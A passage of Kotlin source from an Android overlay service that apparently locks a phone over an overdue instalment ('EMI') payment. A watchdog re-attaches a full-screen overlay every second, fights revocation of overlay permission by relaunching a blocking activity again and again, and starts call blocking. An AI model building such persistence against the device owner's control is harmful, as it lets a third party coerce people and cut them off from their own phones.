                    Log.d(TAG, "✅ Overlay view still attached - keeping it alive")
                    // Don't remove it - let it stay
                    // Just mark that service was destroyed but overlay should remain
                    isOverlayShowing = true // Keep this flag true so watchdog knows
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error checking overlay view: ${e.message}")
            }
            
            // Don't stop watchdog - let it continue if possible
            // But if service is being destroyed, watchdog handler might be null
            // So we'll let service restart and watchdog will start again
            
            // CRITICAL: Don't call stopWatchdog() or hideOverlayViewOnly()
            // Service will restart and recreate everything
            return
        }
        
        // Only remove overlay if device is unlocked
        Log.d(TAG, "Device is unlocked - removing overlay and stopping service")
        stopWatchdog()
        hideOverlayViewOnly()
    }
    
    /**
     * Watchdog to ensure overlay stays visible
     * Checks every 2 seconds and re-attaches if needed
     */
    private fun startWatchdog() {
        Log.d(TAG, "Starting overlay watchdog")
        stopWatchdog() // Stop any existing watchdog
        
        watchdogRunnable = object : Runnable {
            override fun run() {
                // CRITICAL: Always check lock status first
                val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
                
                if (!isLocked) {
                    // Device is unlocked - stop watchdog
                    Log.d(TAG, "🐕 WATCHDOG: Device unlocked, stopping watchdog")
                    stopWatchdog()
                    return
                }
                
                // Device is locked - ensure overlay is showing
                try {
                    // CRITICAL: Check overlay permission FIRST
                    if (!canDrawOverlays()) {
                        // Only show blocking activity if not already showing (prevent multiple launches)
                        if (!isBlockingActivityShowing) {
                            Log.e(TAG, "🚨🚨🚨 WATCHDOG: OVERLAY PERMISSION LOST! 🚨🚨🚨")
                            Log.e(TAG, "Overlay permission was revoked - removing overlay and showing blocking activity")
                            
                            // Mark as showing to prevent multiple launches
                            isBlockingActivityShowing = true
                            
                            // CRITICAL: Remove overlay view immediately (Android may have already removed it)
                            try {
                                overlayView?.let { view ->
                                    if (view.parent != null) {
                                        try {
                                            windowManager?.removeView(view)
                                            Log.d(TAG, "✅ Removed overlay view (permission lost)")
                                        } catch (e: Exception) {
                                            Log.d(TAG, "Overlay view already removed by system: ${e.message}")
                                        }
                                    }
                                }
                                overlayView = null
                                overlayParams = null
                                isOverlayShowing = false
                            } catch (e: Exception) {
                                Log.d(TAG, "Error removing overlay view: ${e.message}")
                                overlayView = null
                                overlayParams = null
                                isOverlayShowing = false
                            }
                            
                            // Show blocking activity immediately - this MUST happen
                            // Use Handler to ensure it runs on main thread
                            Handler(Looper.getMainLooper()).post {
                                try {
                                    // CRITICAL: Launch blocking activity DIRECTLY
                                    // First, bring app to foreground
                                    try {
                                        val packageManager = packageManager
                                        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                                        launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        launchIntent?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                        launchIntent?.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                        startActivity(launchIntent)
                                        Log.d(TAG, "✅ App brought to foreground first")
                                    } catch (e: Exception) {
                                        Log.d(TAG, "Could not bring app to foreground: ${e.message}")
                                    }
                                    
                                    // Small delay to ensure app is in foreground, then launch blocking activity
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        try {
                                            val blockingIntent = Intent(this@SystemOverlayService, OverlayPermissionBlockingActivity::class.java).apply {
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                                addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT)
                                                addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                                            }
                                            startActivity(blockingIntent)
                                            Log.e(TAG, "✅✅✅ WATCHDOG: Blocking activity launched ✅✅✅")
                                            
                                            // CRITICAL: Bring activity to front multiple times to ensure visibility
                                            Handler(Looper.getMainLooper()).postDelayed({
                                                try {
                                                    // Try to bring activity to front using package name
                                                    val intent = packageManager.getLaunchIntentForPackage(packageName)
                                                    intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                    intent?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                                    startActivity(intent)
                                                    
                                                    // Then launch blocking activity again to ensure it's on top
                                                    Handler(Looper.getMainLooper()).postDelayed({
                                                        try {
                                                            val blockingIntent2 = Intent(this@SystemOverlayService, OverlayPermissionBlockingActivity::class.java).apply {
                                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                                                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                                                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                                            }
                                                            startActivity(blockingIntent2)
                                                            Log.e(TAG, "✅✅✅ Blocking activity re-launched to ensure visibility ✅✅✅")
                                                        } catch (e: Exception) {
                                                            Log.d(TAG, "Could not re-launch blocking activity: ${e.message}")
                                                        }
                                                    }, 200)
                                                } catch (e: Exception) {
                                                    Log.d(TAG, "Could not bring app to front: ${e.message}")
                                                }
                                            }, 300)
                                            
                                        } catch (e: Exception) {
                                            Log.e(TAG, "❌❌❌ WATCHDOG: CRITICAL ERROR showing blocking activity: ${e.message} ❌❌❌", e)
                                            isBlockingActivityShowing = false // Reset flag on error
                                            // Try again after delay
                                            Handler(Looper.getMainLooper()).postDelayed({
                                                try {
                                                    val blockingIntent = Intent(this@SystemOverlayService, OverlayPermissionBlockingActivity::class.java).apply {
                                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                        addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                                        addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                                        addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT)
                                                        addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                                                    }
                                                    startActivity(blockingIntent)
                                                    isBlockingActivityShowing = true
                                                    Log.e(TAG, "✅ Blocking activity shown on retry")
                                                } catch (e2: Exception) {
                                                    Log.e(TAG, "❌ Retry also failed: ${e2.message}", e2)
                                                    isBlockingActivityShowing = false
                                                }
                                            }, 500)
                                        }
                                    }, 500) // 500ms delay to ensure app is in foreground
                                } catch (e: Exception) {
                                    Log.e(TAG, "❌ Error in handler: ${e.message}", e)
                                    isBlockingActivityShowing = false
                                }
                            }
                        } else {
                            // Activity already showing - check if settings is being opened
                            if (OverlayPermissionBlockingActivity.isOpeningSettings()) {
                                Log.d(TAG, "Settings is being opened - not interfering with blocking activity")
                                // Continue monitoring but don't bring activity to front
                                watchdogHandler?.postDelayed(this, 1000)
                                return
                            }
                            
                            // Activity already showing - just ensure it's on top
                            Log.d(TAG, "Blocking activity already showing - ensuring it stays on top")
                            Handler(Looper.getMainLooper()).post {
                                try {
                                    val blockingIntent = Intent(this@SystemOverlayService, OverlayPermissionBlockingActivity::class.java).apply {
                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                        addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                    }
                                    startActivity(blockingIntent)
                                } catch (e: Exception) {
                                    Log.d(TAG, "Could not bring activity to front: ${e.message}")
                                }
                            }
                        }
                        
                        // Continue monitoring - check every 1 second to ensure blocking activity stays
                        watchdogHandler?.postDelayed(this, 1000)
                        return
                    } else {
                        // Permission is back - reset flag
                        if (isBlockingActivityShowing) {
                            Log.d(TAG, "✅ Permission restored - resetting blocking activity flag")
                            isBlockingActivityShowing = false
                        }
                    }
                    
                    val overlayExists = overlayView != null
                    val overlayAttached = overlayView?.parent != null
                    val overlayShowing = isOverlayShowing
                    
                    Log.d(TAG, "🐕 WATCHDOG: Checking overlay - exists: $overlayExists, attached: $overlayAttached, showing: $overlayShowing")
                    
                    if (!overlayExists || !overlayAttached || !overlayShowing) {
                        Log.w(TAG, "🚨 WATCHDOG: Overlay missing/detached! Re-creating immediately...")
                        val message = prefs.getString(KEY_LOCK_MESSAGE, "Your EMI is overdue. Please contact shopkeeper.") ?: "Your EMI is overdue. Please contact shopkeeper."
                        val amount = prefs.getString(KEY_LOCK_AMOUNT, "0") ?: "0"
                        
                        // Remove old overlay if exists
                        try {
                            overlayView?.let { view ->
                                if (view.parent != null) {
                                    windowManager?.removeView(view)
                                }
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "Old overlay already removed or error removing: ${e.message}")
                        }
                        
                        // Re-create overlay view
                        overlayView = createOverlayView(message, amount)
                        
                        // Re-create layout params
                        val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        } else {
                            @Suppress("DEPRECATION")
                            WindowManager.LayoutParams.TYPE_PHONE
                        }
                        
                        overlayParams = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                            WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            gravity = Gravity.TOP or Gravity.START
                            x = 0
                            y = 0
                        }
                        
                        // Re-attach overlay
                        try {
                            windowManager?.addView(overlayView, overlayParams)
                            isOverlayShowing = true
                            Log.d(TAG, "✅ WATCHDOG: Overlay re-created and re-attached successfully")
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ WATCHDOG: Error adding overlay view: ${e.message}", e)
                            // If we can't add overlay (permission issue), show blocking activity
                            if (e.message?.contains("permission") == true || !canDrawOverlays()) {
                                Log.e(TAG, "🚨 Permission issue detected - showing blocking activity")
                                try {
                                    val blockingIntent = Intent(this@SystemOverlayService, OverlayPermissionBlockingActivity::class.java).apply {
                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                        addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                    }
                                    startActivity(blockingIntent)
                                } catch (e2: Exception) {
                                    Log.e(TAG, "❌ Error showing blocking activity: ${e2.message}", e2)
                                }
                            }
                            overlayView = null
                            overlayParams = null
                        }
                    } else {
                        // Overlay exists and is attached - verify it's still visible
                        if (overlayView?.visibility != View.VISIBLE) {
                            Log.w(TAG, "🚨 WATCHDOG: Overlay is not visible! Making it visible...")
                            overlayView?.visibility = View.VISIBLE
                        }
                        Log.d(TAG, "✅ WATCHDOG: Overlay is showing correctly")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ WATCHDOG: Error checking/recreating overlay: ${e.message}", e)
                    // Try to recreate overlay completely
                    try {
                        val message = prefs.getString(KEY_LOCK_MESSAGE, "Your EMI is overdue. Please contact shopkeeper.") ?: "Your EMI is overdue. Please contact shopkeeper."
                        val amount = prefs.getString(KEY_LOCK_AMOUNT, "0") ?: "0"
                        showOverlay(message, amount)
                    } catch (e2: Exception) {
                        Log.e(TAG, "❌ WATCHDOG: Failed to recreate overlay: ${e2.message}", e2)
                    }
                }
                
                // Schedule next check in 1 second (more frequent checks)
                watchdogHandler?.postDelayed(this, 1000)
            }
        }
        
        // Start watchdog with initial delay of 1 second (more frequent checks to keep overlay alive)
        watchdogHandler?.postDelayed(watchdogRunnable!!, 1000)
    }
    
    /**
     * Stop watchdog
     */
    private fun stopWatchdog() {
        watchdogRunnable?.let { runnable ->
            watchdogHandler?.removeCallbacks(runnable)
            watchdogRunnable = null
            Log.d(TAG, "Overlay watchdog stopped")
        }
    }
    
    /**
     * Start call blocking service
     */
    private fun startCallBlocking() {
        try {
            val intent = Intent(this, CallBlockingService::class.java).apply {
                action = "START_BLOCKING"
            }
            startService(intent)
            Log.d(TAG, "✅ Call blocking service started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error starting call blocking service: ${e.message}", e)
        }
    }
    
    /**
     * Stop call blocking service
     */
    private fun stopCallBlocking() {
        try {
            val intent = Intent(this, CallBlockingService::class.java).apply {
                action = "STOP_BLOCKING"
            }
            startService(intent)
            Log.d(TAG, "✅ Call blocking service stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error stopping call blocking service: ${e.message}", e)
        }
    }
}
